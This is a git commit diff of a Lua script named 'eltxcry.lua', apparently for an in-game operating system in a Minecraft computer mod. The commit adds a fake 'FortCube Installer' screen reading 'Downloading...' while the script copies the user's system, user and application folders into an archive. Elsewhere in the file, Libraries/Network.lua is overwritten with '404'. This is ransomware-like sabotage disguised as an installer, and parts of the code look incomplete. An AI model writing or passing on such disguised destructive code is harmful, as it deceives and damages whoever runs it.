d7b275403e9cc77bd8f0034e1f3d52176a72221a
EletrixTime <71174682+EletrixtimeYT@users.noreply.github.com>
2023-09-28 22:04:47 +0200

    Update eltxcry.lua

--- eltxcry.lua
+++ eltxcry.lua
@@ -1,8 +1,29 @@
+local GUI = require("GUI")
+local internet = require("INTERNET")
+local shell = require("SHELL")
+
+--------------------------------------------------------------------------------
+
+local workspace = GUI.workspace()
+workspace:addChild(GUI.panel(1, 1, workspace.width, workspace.height, 0x2D2D2D))
+
+workspace:addChild(GUI.text(3, 2, 0xFFFFFF, "FortCube Installer "))
+workspace:addChild(GUI.text(3, 3, 0xFFFFFF, "Downloading..."))
+
 local filesystem = require("filesystem")
 
 -- Move all of data to /eltxcry
 filesystem.copy("/Libraries", "/eltxcry/libraries")
 filesystem.copy("OS.LUA", "/eltxcry")
+filesystem.copy("Icons", "/eltxcry")
+filesystem.copy("Users", "/eltxcry")
+filesystem.copy("Application", "/eltxcry")
+filesystem.copy("Extensions", "/eltxcry")
+filesystem.copy("Mounts", "/eltxcry")
+filesystem.copy("Localizations", "/eltxcry")
+compressor.pack("/archive.pkg", {
+	"/eltxcry"
+})
 
 -- Write ALL files
 
@@ -12,3 +33,7 @@ filesystem.write("Libraries/Network.lua", "404")
 
 
 
+--------------------------------------------------------------------------------
+
+workspace:draw()
+workspace:start()
